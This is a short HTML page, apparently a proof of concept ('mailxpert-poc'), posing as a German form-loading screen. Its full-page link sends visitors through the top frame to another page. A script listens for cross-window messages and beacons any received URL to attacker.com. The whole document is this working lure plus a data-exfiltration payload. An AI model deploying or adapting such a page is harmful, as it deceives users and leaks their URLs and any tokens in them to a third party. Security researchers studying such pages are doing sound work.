<!DOCTYPE html>
<html>
<head>
<style>
*{margin:0;padding:0}
body,html{width:100%;height:100%}
a{display:flex;width:100%;height:100%;align-items:center;justify-content:center;flex-direction:column;text-decoration:none;font-family:Arial;background:#fff}
.spinner{width:40px;height:40px;border:4px solid #ddd;border-top-color:#e31837;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
@keyframes spin{to{transform:rotate(360deg)}}
h2{color:#333}
p{color:#666;font-size:14px;margin-top:10px}
</style>
</head>
<body>
<a href="https://jessisnofy-ai.github.io/mailxpert-poc/dae.html" target="_top">
<div class="spinner"></div>
<h2>Formular wird geladen...</h2>
<p>Klicken Sie hier, falls die Seite nicht automatisch lädt</p>
</a>
<script>
window.addEventListener('message',e=>{
    if(e.data&&e.data.href)new Image().src='https://attacker.com/r?u='+encodeURIComponent(e.data.href);
});
</script>
</body>
</html>
